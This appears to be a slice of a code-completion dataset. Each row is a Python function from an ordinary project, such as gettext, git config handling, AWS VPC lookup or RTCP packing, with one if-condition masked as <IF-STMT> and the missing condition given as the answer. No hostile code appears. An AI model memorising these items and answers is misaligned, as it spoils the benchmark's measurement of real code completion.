1347,"def get_normal_sample(in_file):<tab>""""""Retrieve normal sample if normal/turmor""""""<tab>with utils.open_gzipsafe(in_file) as in_handle:<tab><tab>for line in in_handle:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>parts = line.strip().split(""Original="")[1][:-1]<tab><tab><tab><tab>return parts","if line . startswith ( ""##PEDIGREE"" ) :",94
1348,"def generate_html_index(index_file, outdir):<tab>data = parse_index_file(index_file)<tab>data = ((d[0], d[1]) for d in data)<tab>for i, chunk in enumerate(web.group(data, 1000)):<tab><tab>back = ""..""<tab><tab>index = t_html_layout(t_html_sitemap(back, chunk))<tab><tab>path = outdir + ""/%02d/%05d.html"" % (i / 1000, i)<tab><tab>write(path, web.safestr(index))<tab>for f in os.listdir(outdir):<tab><tab>path = os.path.join(outdir, f)<tab><tab><IF-STMT><tab><tab><tab>dirindex(path)<tab>dirindex(outdir, back=""."")",if os . path . isdir ( path ) :,185
1349,"def _aggregate_metadata_attribute(<tab>self, attr, agg_func=np.max, default_value=0, from_type_metadata=True):<tab>attr_values = []<tab>for a in self.appliances:<tab><tab><IF-STMT><tab><tab><tab>attr_value = a.type.get(attr)<tab><tab>else:<tab><tab><tab>attr_value = a.metadata.get(attr)<tab><tab>if attr_value is not None:<tab><tab><tab>attr_values.append(attr_value)<tab>if len(attr_values) == 0:<tab><tab>return default_value<tab>else:<tab><tab>return agg_func(attr_values)",if from_type_metadata :,162
1350,"def install(self, unicode=False, names=None):<tab>import __builtin__<tab>__builtin__.__dict__[""_""] = unicode and self.ugettext or self.gettext<tab>if hasattr(names, ""__contains__""):<tab><tab>if ""gettext"" in names:<tab><tab><tab>__builtin__.__dict__[""gettext""] = __builtin__.__dict__[""_""]<tab><tab>if ""ngettext"" in names:<tab><tab><tab>__builtin__.__dict__[""ngettext""] = (<tab><tab><tab><tab>unicode and self.ungettext or self.ngettext<tab><tab><tab>)<tab><tab><IF-STMT><tab><tab><tab>__builtin__.__dict__[""lgettext""] = self.lgettext<tab><tab>if ""lngettext"" in names:<tab><tab><tab>__builtin__.__dict__[""lngettext""] = self.lngettext","if ""lgettext"" in names :",181
1351,def logic():<tab>while 1:<tab><tab>if reset == ACTIVE_LOW:<tab><tab><tab>yield reset.posedge<tab><tab>for i in range(20):<tab><tab><tab>yield clock.posedge<tab><tab><tab><IF-STMT><tab><tab><tab><tab>count.next = i<tab><tab>j = 1<tab><tab>while j < 25:<tab><tab><tab>if enable:<tab><tab><tab><tab>yield clock.posedge<tab><tab><tab>yield clock.posedge<tab><tab><tab>count.next = 2 * j<tab><tab><tab>j += 1,if enable :,123
1352,"def multi_device(reader, dev_count):<tab>if dev_count == 1:<tab><tab>for batch in reader:<tab><tab><tab>yield batch<tab>else:<tab><tab>batches = []<tab><tab>for batch in reader:<tab><tab><tab>batches.append(batch)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>yield batches<tab><tab><tab><tab>batches = []",if len ( batches ) == dev_count :,92
1353,"def lockfile_from_pipfile(cls, pipfile_path):<tab>from .pipfile import Pipfile<tab>if os.path.isfile(pipfile_path):<tab><tab><IF-STMT><tab><tab><tab>pipfile_path = os.path.abspath(pipfile_path)<tab><tab>pipfile = Pipfile.load(os.path.dirname(pipfile_path))<tab><tab>return plette.lockfiles.Lockfile.with_meta_from(pipfile._pipfile)<tab>raise PipfileNotFound(pipfile_path)",if not os . path . isabs ( pipfile_path ) :,139
1354,"def _resolve_result(self, f=None):<tab>try:<tab><tab>if f:<tab><tab><tab>results = f.result()<tab><tab>else:<tab><tab><tab>results = list(map(self._client.results.get, self.msg_ids))<tab><tab><IF-STMT><tab><tab><tab>r = results[0]<tab><tab><tab>if isinstance(r, Exception):<tab><tab><tab><tab>raise r<tab><tab>else:<tab><tab><tab>results = error.collect_exceptions(results, self._fname)<tab><tab>self._success = True<tab><tab>self.set_result(self._reconstruct_result(results))<tab>except Exception as e:<tab><tab>self._success = False<tab><tab>self.set_exception(e)",if self . _single_result :,174
1355,"def config_update(self, *updates):<tab>filename = os.path.join(self.path, "".git"", ""config"")<tab>with GitConfigParser(file_or_files=filename, read_only=False) as config:<tab><tab>for section, key, value in updates:<tab><tab><tab>try:<tab><tab><tab><tab>old = config.get(section, key)<tab><tab><tab><tab>if value is None:<tab><tab><tab><tab><tab>config.remove_option(section, key)<tab><tab><tab><tab><tab>continue<tab><tab><tab><tab>if old == value:<tab><tab><tab><tab><tab>continue<tab><tab><tab>except (NoSectionError, NoOptionError):<tab><tab><tab><tab>pass<tab><tab><tab><IF-STMT><tab><tab><tab><tab>config.set_value(section, key, value)",if value is not None :,183
1356,"def process_percent(token, state, command_line):<tab>if not state.is_range_start_line_parsed:<tab><tab>if command_line.line_range.start:<tab><tab><tab>raise ValueError(""bad range: {0}"".format(state.scanner.state.source))<tab><tab>command_line.line_range.start.append(token)<tab>else:<tab><tab><IF-STMT><tab><tab><tab>raise ValueError(""bad range: {0}"".format(state.scanner.state.source))<tab><tab>command_line.line_range.end.append(token)<tab>return parse_line_ref, command_line",if command_line . line_range . end :,154
1357,"def Flatten(self, metadata, value_to_flatten):<tab>if metadata:<tab><tab>self.metadata = metadata<tab>for desc in value_to_flatten.type_infos:<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>if hasattr(self, desc.name) and value_to_flatten.HasField(desc.name):<tab><tab><tab>setattr(self, desc.name, getattr(value_to_flatten, desc.name))","if desc . name == ""metadata"" :",108
1358,"def create_model(model, args, is_train):<tab>""""""Create model, include basic model, googlenet model and mixup model""""""<tab>data_loader, data = utility.create_data_loader(is_train, args)<tab>if args.model == ""GoogLeNet"":<tab><tab>loss_out = _googlenet_model(data, model, args, is_train)<tab>else:<tab><tab><IF-STMT><tab><tab><tab>loss_out = _mixup_model(data, model, args, is_train)<tab><tab>else:<tab><tab><tab>loss_out = _basic_model(data, model, args, is_train)<tab>return data_loader, loss_out",if args . use_mixup and is_train :,175
1359,"def __init__(self, store):<tab>if store.context_aware:<tab><tab>self.contexts = list(store.contexts())<tab><tab>self.default_context = store.default_context.identifier<tab><tab><IF-STMT><tab><tab><tab>self.contexts.append(store.default_context)<tab>else:<tab><tab>self.contexts = [store]<tab><tab>self.default_context = None<tab>super(TrigSerializer, self).__init__(store)",if store . default_context :,110
1360,"def validate_import_depth(namespace):<tab>depth = namespace.depth<tab>if depth is not None:<tab><tab>try:<tab><tab><tab>depth = int(depth)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>raise CLIError(""Depth should be at least 1."")<tab><tab>except ValueError:<tab><tab><tab>raise CLIError(""Depth is not a number."")",if depth < 1 :,85
1361,"def __sync(self):<tab>""""""Skip reader to the block boundary.""""""<tab>pad_length = BLOCK_SIZE - self.__reader.tell() % BLOCK_SIZE<tab>if pad_length and pad_length != BLOCK_SIZE:<tab><tab>data = self.__reader.read(pad_length)<tab><tab><IF-STMT><tab><tab><tab>raise EOFError(""Read %d bytes instead of %d"" % (len(data), pad_length))",if len ( data ) != pad_length :,109
1362,"def _split_long_text(text, idx, size):<tab>splited_text = text.split()<tab>if len(splited_text) > 25:<tab><tab><IF-STMT><tab><tab><tab># The first is (...)text<tab><tab><tab>first = """"<tab><tab>else:<tab><tab><tab>first = "" "".join(splited_text[:10])<tab><tab>if idx != 0 and idx == size - 1:<tab><tab><tab># The last is text(...)<tab><tab><tab>last = """"<tab><tab>else:<tab><tab><tab>last = "" "".join(splited_text[-10:])<tab><tab>return ""{}(...){}"".format(first, last)<tab>return text",if idx == 0 :,156
1363,"def download_label_map(out_dir):<tab>log.info(""Downloading ScanNet "" + RELEASE_NAME + "" label mapping file..."")<tab>files = [LABEL_MAP_FILE]<tab>for file in files:<tab><tab>url = BASE_URL + RELEASE_TASKS + ""/"" + file<tab><tab>localpath = os.path.join(out_dir, file)<tab><tab>localdir = os.path.dirname(localpath)<tab><tab><IF-STMT><tab><tab><tab>os.makedirs(localdir)<tab><tab>download_file(url, localpath)<tab>log.info(""Downloaded ScanNet "" + RELEASE_NAME + "" label mapping file."")",if not os . path . isdir ( localdir ) :,157
1364,"def get_related_ids(self, resources):<tab>vpc_ids = [vpc[""VpcId""] for vpc in resources]<tab>vpc_igw_ids = set()<tab>for igw in self.manager.get_resource_manager(""internet-gateway"").resources():<tab><tab>for attachment in igw[""Attachments""]:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>vpc_igw_ids.add(igw[""InternetGatewayId""])<tab>return vpc_igw_ids","if attachment . get ( ""VpcId"" , """" ) in vpc_ids :",125
1365,"def visit_Assign(self, node):<tab>""""""Handle visiting an assignment statement.""""""<tab>ups = set()<tab>for targ in node.targets:<tab><tab>if isinstance(targ, (Tuple, List)):<tab><tab><tab>ups.update(leftmostname(elt) for elt in targ.elts)<tab><tab>elif isinstance(targ, BinOp):<tab><tab><tab>newnode = self.try_subproc_toks(node)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>ups.add(leftmostname(targ))<tab><tab><tab>else:<tab><tab><tab><tab>return newnode<tab><tab>else:<tab><tab><tab>ups.add(leftmostname(targ))<tab>self.ctxupdate(ups)<tab>return node",if newnode is node :,165
1366,"def evex_mask_dest_reg_only(ii):  # optional imm8<tab>i, m, xyz = 0, 0, 0<tab>for op in _gen_opnds(ii):<tab><tab>if op_mask_reg(op):<tab><tab><tab>m += 1<tab><tab>elif op_xmm(op) or op_ymm(op) or op_zmm(op):<tab><tab><tab>xyz += 1<tab><tab><IF-STMT><tab><tab><tab>i += 1<tab><tab>else:<tab><tab><tab>return False<tab>return m == 1 and xyz > 0 and i <= 1",elif op_imm8 ( op ) :,143
1367,"def get_pynames(self, parameters):<tab>result = [None] * max(len(parameters), len(self.args))<tab>for index, arg in enumerate(self.args):<tab><tab><IF-STMT><tab><tab><tab>result[parameters.index(arg.arg)] = self._evaluate(arg.value)<tab><tab>else:<tab><tab><tab>result[index] = self._evaluate(arg)<tab>return result","if isinstance ( arg , ast . keyword ) and arg . arg in parameters :",110
1368,"def _discovery_modules(self) -> List[str]:<tab>modules: List[str] = []<tab>autodiscover = self.conf.autodiscover<tab>if autodiscover:<tab><tab><IF-STMT><tab><tab><tab>if self.conf.origin is None:<tab><tab><tab><tab>raise ImproperlyConfigured(E_NEED_ORIGIN)<tab><tab>elif callable(autodiscover):<tab><tab><tab>modules.extend(cast(Callable[[], Iterator[str]], autodiscover)())<tab><tab>else:<tab><tab><tab>modules.extend(autodiscover)<tab><tab>if self.conf.origin:<tab><tab><tab>modules.append(self.conf.origin)<tab>return modules","if isinstance ( autodiscover , bool ) :",149
1369,"def _lock(self, files, type):<tab>for i in count(0):<tab><tab>lockfile = os.path.join(self._lockdir, ""{}.{}.lock"".format(i, type))<tab><tab><IF-STMT><tab><tab><tab>self._lockfile[type] = lockfile<tab><tab><tab>with open(lockfile, ""w"") as lock:<tab><tab><tab><tab>print(*files, sep=""\n"", file=lock)<tab><tab><tab>return",if not os . path . exists ( lockfile ) :,113
1370,"def _init_inheritable_dicts_(cls):<tab>if cls.__bases__ != (object,):<tab><tab>return<tab>for attr in cls._inheritable_dict_attrs_:<tab><tab>if isinstance(attr, tuple):<tab><tab><tab>attr_name, default = attr<tab><tab>else:<tab><tab><tab>attr_name, default = attr, {}<tab><tab><IF-STMT><tab><tab><tab>raise SyntaxError(""{} is not a dictionary"".format(attr_name))<tab><tab>setattr(cls, attr_name, default)","if not isinstance ( default , dict ) :",122
1371,"def _validate_name(self, name):<tab>if isinstance(name, str):<tab><tab>name = dns.name.from_text(name, None)<tab>elif not isinstance(name, dns.name.Name):<tab><tab>raise KeyError(""name parameter must be convertible to a DNS name"")<tab>if name.is_absolute():<tab><tab>if not name.is_subdomain(self.origin):<tab><tab><tab>raise KeyError(""name parameter must be a subdomain of the zone origin"")<tab><tab><IF-STMT><tab><tab><tab>name = name.relativize(self.origin)<tab>return name",if self . relativize :,142
1372,"def hard_update(self, cache, size_change, pins_gates):<tab>""""""replace verts, rads and vel (in NumPy)""""""<tab>verts, rads, vel, react = cache<tab>if len(verts) == self.v_len:<tab><tab><IF-STMT><tab><tab><tab>unpinned = self.params[""unpinned""]<tab><tab><tab>self.verts[unpinned] = verts[unpinned]<tab><tab>else:<tab><tab><tab>self.verts = verts<tab><tab>self.vel = vel<tab><tab>if not size_change:<tab><tab><tab>self.rads = rads",if pins_gates [ 0 ] and pins_gates [ 1 ] :,155
1373,"def enable(self):<tab>""""""enable the patch.""""""<tab>for patch in self.dependencies:<tab><tab>patch.enable()<tab>if not self.enabled:<tab><tab>pyv = sys.version_info[0]<tab><tab>if pyv == 2:<tab><tab><tab>if self.PY2 == SKIP:<tab><tab><tab><tab>return  # skip patch activation<tab><tab><tab>if not self.PY2:<tab><tab><tab><tab>raise IncompatiblePatch(""Python 2 not supported!"")<tab><tab>if pyv == 3:<tab><tab><tab>if self.PY3 == SKIP:<tab><tab><tab><tab>return  # skip patch activation<tab><tab><tab><IF-STMT><tab><tab><tab><tab>raise IncompatiblePatch(""Python 3 not supported!"")<tab><tab>self.pre_enable()<tab><tab>self.do_enable()<tab><tab>self.enabled = True",if not self . PY3 :,191
1374,def on_project_dialog_finished(self):<tab>if self.sender().committed:<tab><tab><IF-STMT><tab><tab><tab>self.close_project()<tab><tab><tab>self.project_manager.from_dialog(self.sender())<tab><tab>else:<tab><tab><tab>self.project_manager.project_updated.emit(),if self . sender ( ) . new_project :,83
1375,"def filter_database(db, user, filter_name):<tab>""""""Returns a list of person handles""""""<tab>filt = MatchesFilter([filter_name])<tab>filt.requestprepare(db, user)<tab>if user:<tab><tab>user.begin_progress(<tab><tab><tab>_(""Finding relationship paths""),<tab><tab><tab>_(""Retrieving all sub-filter matches""),<tab><tab><tab>db.get_number_of_people(),<tab><tab>)<tab>matches = []<tab>for handle in db.iter_person_handles():<tab><tab>person = db.get_person_from_handle(handle)<tab><tab><IF-STMT><tab><tab><tab>matches.append(handle)<tab><tab>if user:<tab><tab><tab>user.step_progress()<tab>if user:<tab><tab>user.end_progress()<tab>filt.requestreset()<tab>return matches","if filt . apply ( db , person ) :",198
1376,"def add(self, key, val):<tab>if key is None:<tab><tab>g.trace(""TypeDict: None is not a valid key"", g.callers())<tab><tab>return<tab>self._checkKeyType(key)<tab>self._checkValType(val)<tab>if self.isList:<tab><tab>aList = self.d.get(key, [])<tab><tab><IF-STMT><tab><tab><tab>aList.append(val)<tab><tab><tab>self.d[key] = aList<tab>else:<tab><tab>self.d[key] = val",if val not in aList :,134
1377,"def show_help(ctx, param, value):<tab>if value and not ctx.resilient_parsing:<tab><tab><IF-STMT><tab><tab><tab># legit main help<tab><tab><tab>echo(format_help(ctx.get_help()))<tab><tab>else:<tab><tab><tab># legit sub-command help<tab><tab><tab>echo(ctx.get_help(), color=ctx.color)<tab><tab>ctx.exit()",if not ctx . invoked_subcommand :,99
1378,"def wav_to_spec(wav_audio, hparams):<tab>""""""Transforms the contents of a wav file into a series of spectrograms.""""""<tab>if hparams.spec_type == ""raw"":<tab><tab>spec = _wav_to_framed_samples(wav_audio, hparams)<tab>else:<tab><tab><IF-STMT><tab><tab><tab>spec = _wav_to_cqt(wav_audio, hparams)<tab><tab>elif hparams.spec_type == ""mel"":<tab><tab><tab>spec = _wav_to_mel(wav_audio, hparams)<tab><tab>else:<tab><tab><tab>raise ValueError(""Invalid spec_type: {}"".format(hparams.spec_type))<tab><tab>if hparams.spec_log_amplitude:<tab><tab><tab>spec = librosa.power_to_db(spec)<tab>return spec","if hparams . spec_type == ""cqt"" :",197
1379,"def __bytes__(self) -> bytes:<tab>payload = pack(""!LL"", self.ssrc, self.media_ssrc)<tab>if self.lost:<tab><tab>pid = self.lost[0]<tab><tab>blp = 0<tab><tab>for p in self.lost[1:]:<tab><tab><tab>d = p - pid - 1<tab><tab><tab><IF-STMT><tab><tab><tab><tab>blp |= 1 << d<tab><tab><tab>else:<tab><tab><tab><tab>payload += pack(""!HH"", pid, blp)<tab><tab><tab><tab>pid = p<tab><tab><tab><tab>blp = 0<tab><tab>payload += pack(""!HH"", pid, blp)<tab>return pack_rtcp_packet(RTCP_RTPFB, self.fmt, payload)",if d < 16 :,174
1380,"def run() -> None:<tab>nonlocal state, timeout<tab>while True:<tab><tab><IF-STMT><tab><tab><tab>disposed.wait(timeout)<tab><tab>if disposed.is_set():<tab><tab><tab>return<tab><tab>time: datetime = self.now<tab><tab>state = action(state)<tab><tab>timeout = seconds - (self.now - time).total_seconds()",if timeout > 0.0 :,92
1381,"def _get_host(self, array, connector, remote=False):<tab>""""""Return dict describing existing Purity host object or None.""""""<tab>if remote and array.get_rest_version() in SYNC_REPLICATION_REQUIRED_API_VERSIONS:<tab><tab>hosts = array.list_hosts(remote=True)<tab>else:<tab><tab>hosts = array.list_hosts()<tab>matching_hosts = []<tab>for host in hosts:<tab><tab>for wwn in connector[""wwpns""]:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>matching_hosts.append(host)<tab><tab><tab><tab>break  # go to next host<tab>return matching_hosts","if wwn . lower ( ) in str ( host [ ""wwn"" ] ) . lower ( ) :",165
1382,"def validate_moment(self, moment: ""cirq.Moment""):<tab>super().validate_moment(moment)<tab>for op in moment.operations:<tab><tab><IF-STMT><tab><tab><tab>for other in moment.operations:<tab><tab><tab><tab>if other is not op and self._check_if_exp11_operation_interacts(<tab><tab><tab><tab><tab>cast(ops.GateOperation, op), cast(ops.GateOperation, other)<tab><tab><tab><tab>):<tab><tab><tab><tab><tab>raise ValueError(""Adjacent Exp11 operations: {}."".format(moment))","if isinstance ( op . gate , ops . CZPowGate ) :",142
1383,"def construct_instances(self, row, keys=None):<tab>collected_models = {}<tab>for i, (key, constructor, attr, conv) in enumerate(self.column_map):<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>value = row[i]<tab><tab>if key not in collected_models:<tab><tab><tab>collected_models[key] = constructor()<tab><tab>instance = collected_models[key]<tab><tab>if attr is None:<tab><tab><tab>attr = self.cursor.description[i][0]<tab><tab>if conv is not None:<tab><tab><tab>value = conv(value)<tab><tab>setattr(instance, attr, value)<tab>return collected_models",if keys is not None and key not in keys :,167
1384,"def test_all(self):<tab>expected = []<tab>blacklist = {""executable"", ""nobody_uid"", ""test""}<tab>for name in dir(server):<tab><tab>if name.startswith(""_"") or name in blacklist:<tab><tab><tab>continue<tab><tab>module_object = getattr(server, name)<tab><tab><IF-STMT><tab><tab><tab>expected.append(name)<tab>self.assertCountEqual(server.__all__, expected)","if getattr ( module_object , ""__module__"" , None ) == ""http.server"" :",111
1385,"def _adjust_input(self):<tab>for i in range(len(self.block.ops)):<tab><tab>current_op = self.block.ops[i]<tab><tab>for input_arg in current_op.input_arg_names:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>current_op._rename_input(input_arg, self.input_map[input_arg])",if input_arg in self . input_map :,99
1386,"def __getitem__(self, cls):<tab>try:<tab><tab>return dict.__getitem__(self, cls)<tab>except KeyError as e:<tab><tab><IF-STMT><tab><tab><tab>cls = cls.__class__<tab><tab>for b in reversed(cls.__bases__):<tab><tab><tab>try:<tab><tab><tab><tab>retval = self[b]<tab><tab><tab><tab># this is why a cdict instance must never be modified after<tab><tab><tab><tab># the first lookup<tab><tab><tab><tab>self[cls] = retval<tab><tab><tab><tab>return retval<tab><tab><tab>except KeyError:<tab><tab><tab><tab>pass<tab><tab>raise e","if not hasattr ( cls , ""__bases__"" ) :",146
1387,"def before_read(self, parser, section, option, value):<tab># If we're dealing with a quoted string as the interpolation value,<tab># make sure we load and unquote it so we don't end up with '""value""'<tab>try:<tab><tab>json_value = srsly.json_loads(value)<tab><tab><IF-STMT><tab><tab><tab>value = json_value<tab>except Exception:<tab><tab>pass<tab>return super().before_read(parser, section, option, value)","if isinstance ( json_value , str ) and json_value not in JSON_EXCEPTIONS :",130
1388,"def insert_files(self, urls, pos):<tab>""""""Not only images""""""<tab>image_extensions = ["".png"", "".jpg"", "".bmp"", "".gif""]<tab>for url in urls:<tab><tab>if url.scheme() == ""file"":<tab><tab><tab>path = url.path()<tab><tab><tab>ext = os.path.splitext(path)[1]<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self._insert_image_from_path(path)<tab><tab><tab>else:<tab><tab><tab><tab>self.parent.resource_edit.add_attach(path)",if os . path . exists ( path ) and ext in image_extensions :,144
1389,"def p_constant(self, p):<tab>""""""constant : PP_NUMBER""""""<tab>value = p[1].rstrip(""LlUu"")<tab>try:<tab><tab><IF-STMT><tab><tab><tab>value = int(value[2:], 16)<tab><tab>elif value[0] == ""0"":<tab><tab><tab>value = int(value, 8)<tab><tab>else:<tab><tab><tab>value = int(value)<tab>except ValueError:<tab><tab>value = value.rstrip(""eEfF"")<tab><tab>try:<tab><tab><tab>value = float(value)<tab><tab>except ValueError:<tab><tab><tab>value = 0<tab>p[0] = ConstantExpressionNode(value)","if value [ : 2 ] == ""0x"" :",163
1390,"def _decode_pattern_list(data):<tab>rv = []<tab>contains_dict = False<tab>for item in data:<tab><tab>if isinstance(item, list):<tab><tab><tab>item = _decode_pattern_list(item)<tab><tab><IF-STMT><tab><tab><tab>item = _decode_pattern_dict(item)<tab><tab><tab>contains_dict = True<tab><tab>rv.append(item)<tab># avoid sorting if any element in the list is a dict<tab>if not contains_dict:<tab><tab>rv = sorted(rv)<tab>return rv","elif isinstance ( item , dict ) :",133
1391,"def value(self, mode):<tab>v = super(mn_armt, self).value(mode)<tab>if mode == ""l"":<tab><tab>out = []<tab><tab>for x in v:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>out.append(x[::-1])<tab><tab><tab>elif len(x) == 4:<tab><tab><tab><tab>out.append(x[:2][::-1] + x[2:4][::-1])<tab><tab>return out<tab>elif mode == ""b"":<tab><tab>return [x for x in v]<tab>else:<tab><tab>raise NotImplementedError(""bad attrib"")",if len ( x ) == 2 :,145
1392,"def _press_fire(self):<tab>fire_action = 1<tab>if (<tab><tab>self.is_atari_env<tab><tab>and self.env.unwrapped.get_action_meanings()[fire_action] == ""FIRE""<tab>):<tab><tab>self.current_ale_lives = self.env.unwrapped.ale.lives()<tab><tab>self.step(fire_action)<tab><tab><IF-STMT><tab><tab><tab>self.reset_internal_state()",if self . done :,115
1393,"def update_fid_err_log(self, fid_err):<tab>""""""add an entry to the fid_err log""""""<tab>self.fid_err_log.append(fid_err)<tab>if self.write_to_file:<tab><tab><IF-STMT><tab><tab><tab>mode = ""w""<tab><tab>else:<tab><tab><tab>mode = ""a""<tab><tab>f = open(self.fid_err_file, mode)<tab><tab>f.write(""{}\n"".format(fid_err))<tab><tab>f.close()",if len ( self . fid_err_log ) == 1 :,135
1394,"def _name(self, sender, short=True, full_email=False):<tab>words = re.sub('[""<>]', """", sender).split()<tab>nomail = [w for w in words if not ""@"" in w]<tab>if nomail:<tab><tab>if short:<tab><tab><tab>if len(nomail) > 1 and nomail[0].lower() in self._NAME_TITLES:<tab><tab><tab><tab>return nomail[1]<tab><tab><tab>return nomail[0]<tab><tab>return "" "".join(nomail)<tab>elif words:<tab><tab><IF-STMT><tab><tab><tab>return words[0].split(""@"", 1)[0]<tab><tab>return words[0]<tab>return ""(nobody)""",if not full_email :,168
1395,"def zrx_order_to_json(order: Optional[ZeroExOrder]) -> Optional[Dict[str, any]]:<tab>if order is None:<tab><tab>return None<tab>retval: Dict[str, any] = {}<tab>for key, value in order.items():<tab><tab><IF-STMT><tab><tab><tab>retval[key] = value<tab><tab>else:<tab><tab><tab>retval[f""__binary__{key}""] = base64.b64encode(value).decode(""utf8"")<tab>return retval","if not isinstance ( value , bytes ) :",120
1396,"def _get_outfile(self):<tab>outfile = self.inputs.transformed_file<tab>if not isdefined(outfile):<tab><tab><IF-STMT><tab><tab><tab>if self.inputs.fs_target is True:<tab><tab><tab><tab>src = ""orig.mgz""<tab><tab><tab>else:<tab><tab><tab><tab>src = self.inputs.target_file<tab><tab>else:<tab><tab><tab>src = self.inputs.source_file<tab><tab>outfile = fname_presuffix(src, newpath=os.getcwd(), suffix=""_warped"")<tab>return outfile",if self . inputs . inverse is True :,134
1397,"def close(self):<tab>if self.changed:<tab><tab>save = EasyDialogs.AskYesNoCancel(<tab><tab><tab>'Save window ""%s"" before closing?' % self.name, 1<tab><tab>)<tab><tab><IF-STMT><tab><tab><tab>self.menu_save()<tab><tab>elif save < 0:<tab><tab><tab>return<tab>if self.parent.active == self:<tab><tab>self.parent.active = None<tab>self.parent.updatemenubar()<tab>del self.ted<tab>self.do_postclose()",if save > 0 :,126
1398,"def step(self, action):<tab>""""""Repeat action, sum reward, and max over last observations.""""""<tab>total_reward = 0.0<tab>done = None<tab>for i in range(self._skip):<tab><tab>obs, reward, done, info = self.env.step(action)<tab><tab>if i == self._skip - 2:<tab><tab><tab>self._obs_buffer[0] = obs<tab><tab>if i == self._skip - 1:<tab><tab><tab>self._obs_buffer[1] = obs<tab><tab>total_reward += reward<tab><tab><IF-STMT><tab><tab><tab>break<tab># Note that the observation on the done=True frame doesn't matter.<tab>max_frame = self._obs_buffer.max(axis=0)<tab>return max_frame, total_reward, done, info",if done :,187
1399,"def __isub__(self, other):<tab>""""""In-place subtraction of a matrix or scalar.""""""<tab>if isinstance(other, Matrix):<tab><tab><IF-STMT><tab><tab><tab>raise ValueError(""matrix shapes do not match"")<tab><tab>for row_a, row_b in izip(self._data, other):<tab><tab><tab>for i in xrange(len(row_a)):<tab><tab><tab><tab>row_a[i] -= row_b[i]<tab>else:<tab><tab>for row in self._data:<tab><tab><tab>for i in xrange(len(row)):<tab><tab><tab><tab>row[i] -= other<tab>return self",if self . shape != other . shape :,154
1400,"def check(self, count, count_v, enable, clock, reset, n):<tab>expect = 0<tab>yield reset.posedge<tab>self.assertEqual(count, expect)<tab>self.assertEqual(count, count_v)<tab>while 1:<tab><tab>yield clock.posedge<tab><tab>if enable:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>expect = n - 1<tab><tab><tab>else:<tab><tab><tab><tab>expect -= 1<tab><tab>yield delay(1)<tab><tab># print ""%d count %s expect %s count_v %s"" % (now(), count, expect, count_v)<tab><tab>self.assertEqual(count, expect)<tab><tab>self.assertEqual(count, count_v)",if expect == - n :,170
1401,"def getmod(self, nm):<tab>mod = None<tab>for thing in self.path:<tab><tab>if isinstance(thing, basestring):<tab><tab><tab>owner = self.shadowpath.get(thing, -1)<tab><tab><tab>if owner == -1:<tab><tab><tab><tab>owner = self.shadowpath[thing] = self.__makeOwner(thing)<tab><tab><tab>if owner:<tab><tab><tab><tab>mod = owner.getmod(nm)<tab><tab>else:<tab><tab><tab>mod = thing.getmod(nm)<tab><tab><IF-STMT><tab><tab><tab>break<tab>return mod",if mod :,137
1402,"def get_file_language(filename, text=None):<tab>""""""Get file language from filename""""""<tab>ext = osp.splitext(filename)[1]<tab>if ext.startswith("".""):<tab><tab>ext = ext[1:]  # file extension with leading dot<tab>language = ext<tab>if not ext:<tab><tab>if text is None:<tab><tab><tab>text, _enc = encoding.read(filename)<tab><tab>for line in text.splitlines():<tab><tab><tab>if not line.strip():<tab><tab><tab><tab>continue<tab><tab><tab><IF-STMT><tab><tab><tab><tab>shebang = line[2:]<tab><tab><tab><tab>if ""python"" in shebang:<tab><tab><tab><tab><tab>language = ""python""<tab><tab><tab>else:<tab><tab><tab><tab>break<tab>return language","if line . startswith ( ""#!"" ) :",183
1403,"def do_status(self, directory, path):<tab>with self._repo(directory) as repo:<tab><tab>if path:<tab><tab><tab>path = os.path.join(directory, path)<tab><tab><tab>statuses = repo.status(include=path, all=True)<tab><tab><tab>for status, paths in statuses:<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>return self.statuses[status][0]<tab><tab><tab>return None<tab><tab>else:<tab><tab><tab>resulting_status = 0<tab><tab><tab>for status, paths in repo.status(all=True):<tab><tab><tab><tab>if paths:<tab><tab><tab><tab><tab>resulting_status |= self.statuses[status][1]<tab><tab><tab>return self.repo_statuses_str[resulting_status]",if paths :,181
1404,def _kill(proc):<tab>if proc is None:<tab><tab>return<tab>if proc.stdout is not None:<tab><tab>proc.stdout.close()<tab>if proc.stderr is not None:<tab><tab>proc.stderr.close()<tab><IF-STMT><tab><tab>try:<tab><tab><tab>proc.terminate()<tab><tab>except:<tab><tab><tab>if proc.returncode is None:<tab><tab><tab><tab>try:<tab><tab><tab><tab><tab>proc.kill()<tab><tab><tab><tab>except:<tab><tab><tab><tab><tab>pass,if proc . returncode is None :,125
1405,"def decorated_function(*args, **kwargs):<tab>rv = f(*args, **kwargs)<tab>if isinstance(rv, flask.Response):<tab><tab>try:<tab><tab><tab>result = etag<tab><tab><tab><IF-STMT><tab><tab><tab><tab>result = result(rv)<tab><tab><tab>if result:<tab><tab><tab><tab>rv.set_etag(result)<tab><tab>except Exception:<tab><tab><tab>logging.getLogger(__name__).exception(<tab><tab><tab><tab>""Error while calculating the etag value for response {!r}"".format(rv)<tab><tab><tab>)<tab>return rv",if callable ( result ) :,133
1406,"def _list_shape_iter(shape):<tab>last_shape = _void<tab>for item in shape:<tab><tab>if item is Ellipsis:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>raise ValueError(<tab><tab><tab><tab><tab>""invalid shape spec: Ellipsis cannot be the"" ""first element""<tab><tab><tab><tab>)<tab><tab><tab>while True:<tab><tab><tab><tab>yield last_shape<tab><tab>last_shape = item<tab><tab>yield item",if last_shape is _void :,109
